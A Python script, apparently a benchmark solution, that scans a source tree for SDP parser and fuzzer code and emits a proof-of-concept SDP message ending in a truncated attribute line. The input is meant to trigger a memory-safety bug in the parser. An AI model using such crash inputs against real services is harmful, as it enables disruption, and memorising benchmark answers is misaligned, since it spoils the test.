import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Set, Tuple


class Solution:
    def __init__(self) -> None:
        self._attr_priority = [
            "fingerprint",
            "rtpmap",
            "fmtp",
            "group",
            "msid-semantic",
            "ssrc",
            "candidate",
            "extmap",
            "rtcp-fb",
            "rid",
            "simulcast",
        ]
        self._attr_line: Dict[str, bytes] = {
            "fingerprint": b"a=fingerprint:sha-256",
            "rtpmap": b"a=rtpmap:0",
            "fmtp": b"a=fmtp:0",
            "group": b"a=group:BUNDLE",
            "msid-semantic": b"a=msid-semantic:WMS",
            "ssrc": b"a=ssrc:1",
            "candidate": b"a=candidate:0",
            "extmap": b"a=extmap:1",
            "rtcp-fb": b"a=rtcp-fb:1",
            "rid": b"a=rid:1",
            "simulcast": b"a=simulcast:send",
        }

        self._suspicious_re = re.compile(
            r"""(?isx)
            \bwhile\s*\(\s*
              (?:\(|\s)*
              \*\s*[A-Za-z_][A-Za-z0-9_]*\s*
              (?:==|!=|<=|>=|<|>)\s*
              (?:'[^']*'|"[^"]*"|[A-Za-z0-9_:+-]+)
              .*?
              &&\s*
              [A-Za-z_][A-Za-z0-9_]*\s*
              (?:!=|==|<=|>=|<|>)\s*
              [A-Za-z_][A-Za-z0-9_]*
            """,
            re.DOTALL,
        )

    def _iter_files_dir(self, root: str) -> Iterable[Tuple[str, bytes]]:
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                path = os.path.join(dirpath, fn)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if not os.path.isfile(path):
                    continue
                if st.st_size <= 0 or st.st_size > 2_000_000:
                    continue
                low = fn.lower()
                if not any(low.endswith(ext) for ext in (".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".m", ".mm", ".rs", ".go", ".java", ".kt", ".swift", ".py", ".txt")):
                    continue
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                except OSError:
                    continue
                yield path, data

    def _iter_files_tar(self, tar_path: str) -> Iterable[Tuple[str, bytes]]:
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    name = m.name
                    low = name.lower()
                    base = os.path.basename(low)
                    if not any(base.endswith(ext) for ext in (".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".m", ".mm", ".rs", ".go", ".java", ".kt", ".swift", ".py", ".txt")):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    yield name, data
        except Exception:
            return

    def _scan_sources(self, src_path: str) -> Tuple[Set[str], Set[str], bool]:
        found: Set[str] = set()
        found_likely: Set[str] = set()
        wants_crlf = False

        def consider(path: str) -> bool:
            low = path.lower()
            if any(k in low for k in ("sdp", "fuzz", "parser", "llvmfuzzer", "fuzzer")):
                return True
            return False

        if os.path.isdir(src_path):
            it = self._iter_files_dir(src_path)
        else:
            it = self._iter_files_tar(src_path)

        buf_checked = 0
        for path, data in it:
            buf_checked += 1
            if buf_checked > 20000:
                break

            if b"\x00" in data[:4096]:
                continue

            if not consider(path):
                continue

            lower = data.lower()
            for a in self._attr_priority:
                if a.encode("ascii") in lower:
                    found.add(a)

            if b"llvmfuzzertestoneinput" in lower:
                if b"\\r\\n" in lower or b"\\n\\r" in lower:
                    wants_crlf = True
                if b"\r\n" in lower:
                    wants_crlf = True

            if not wants_crlf and (b"\\r\\n" in lower or b"crlf" in lower or b"\\x0d\\x0a" in lower):
                wants_crlf = True

            try:
                txt = data.decode("utf-8", "ignore")
            except Exception:
                txt = data.decode("latin1", "ignore")

            if self._suspicious_re.search(txt):
                for a in self._attr_priority:
                    if a in txt.lower():
                        found_likely.add(a)

        if not found and not found_likely:
            if os.path.isdir(src_path):
                it2 = self._iter_files_dir(src_path)
            else:
                it2 = self._iter_files_tar(src_path)
            buf_checked = 0
            for path, data in it2:
                buf_checked += 1
                if buf_checked > 25000:
                    break
                if b"\x00" in data[:4096]:
                    continue
                lower = data.lower()
                for a in self._attr_priority:
                    if a.encode("ascii") in lower:
                        found.add(a)
                if b"llvmfuzzertestoneinput" in lower:
                    if b"\\r\\n" in lower or b"\r\n" in lower:
                        wants_crlf = True
                if not wants_crlf and (b"\\r\\n" in lower or b"crlf" in lower):
                    wants_crlf = True
                if found:
                    break

        return found, found_likely, wants_crlf

    def _build_poc(self, attr: str, sep: bytes) -> bytes:
        session = [
            b"v=0",
            b"o=- 0 0 IN IP4 127.0.0.1",
            b"s=-",
            b"t=0 0",
        ]
        media = [
            b"m=audio 9 RTP/AVP 0",
            b"c=IN IP4 0.0.0.0",
        ]

        line = self._attr_line.get(attr, b"a=fingerprint:sha-256")

        if attr == "group":
            lines = session + [line] + media
        else:
            lines = session + media + [line]

        return sep.join(lines) + sep

    def solve(self, src_path: str) -> bytes:
        found, found_likely, wants_crlf = self._scan_sources(src_path)
        sep = b"\r\n" if wants_crlf else b"\n"

        chosen: Optional[str] = None
        for a in self._attr_priority:
            if a in found_likely:
                chosen = a
                break
        if chosen is None:
            for a in self._attr_priority:
                if a in found:
                    chosen = a
                    break
        if chosen is None:
            chosen = "fingerprint"

        return self._build_poc(chosen, sep)